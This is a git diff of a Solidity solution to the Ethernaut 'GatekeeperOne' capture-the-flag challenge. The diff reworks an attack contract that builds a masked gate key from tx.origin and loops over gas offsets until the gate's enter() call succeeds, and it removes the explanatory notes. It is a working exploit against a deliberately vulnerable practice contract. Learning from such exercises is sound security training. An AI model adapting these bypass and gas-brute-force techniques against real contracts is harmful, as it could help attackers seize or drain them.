@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-// 0x0572B9C02192173F019F84D3f42904ed56235eAa
 contract GatekeeperOne {
     address public entrant;
 
@@ -39,9 +38,10 @@ contract GatekeeperOne {
     }
 }
 
-// 0xcb43aF796c6D51aE4122682D9b0b53eea927f5a6
 contract GatekeeperOneAttack {
-    GatekeeperOne public gatekeeperOne;
+    GatekeeperOne gatekeeperOne;
+    bool public isCompleted;
+    bool public isSuccessful;
     uint public gasUsed;
 
     constructor(GatekeeperOne gatekeeperOne_) {
@@ -49,25 +49,24 @@ contract GatekeeperOneAttack {
     }
 
     function attack() public {
-        uint gasStart = gasleft();
-        gatekeeperOne.enter(bytes8(uint64(uint160(msg.sender))));
-        gasUsed = gasStart - gasleft();
+        // Gas amount was found on Remix
+        // _gateKey was worked out by hand
+        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
+            0xFFFFFFFF0000FFFF;
+
+        // Lets test different i values since mumbai
+        // is diff
+        for (uint256 i = 0; i < 3000; i++) {
+            (bool success, ) = address(gatekeeperOne).call{
+                gas: i + (8191 * 10)
+            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
+            if (success) {
+                gasUsed = i;
+                break;
+            }
+        }
+
+        isCompleted = true;
+        isSuccessful = gatekeeperOne.entrant() == address(tx.origin);
     }
 }
-
-/* 
-Notes: 
-
-To pass gateOne, we need to deploy an attack contract.
-To pass gateTow, we need to use the gasleft() function to pass the gate.
-We need to calculate the gasleft() % 8191 == 0. 
-Since we can't do this in between gaetOne and gateTwo,
-we need to calculate the gas gateOne uses.
-The gas for our attack function - gateOne should be a multiple of 8191.
-Not sure how much the require and modifier gas costs are. 
-Instead of caluclating it analytically, we will calculate it empirically.
-We will pass a gas amount to the function, and see how much gas it has 
-when the function reverts. Then we know how much gas will be used to 
-get to gateTwo, and set our gas amount appropriately.
-
-*/
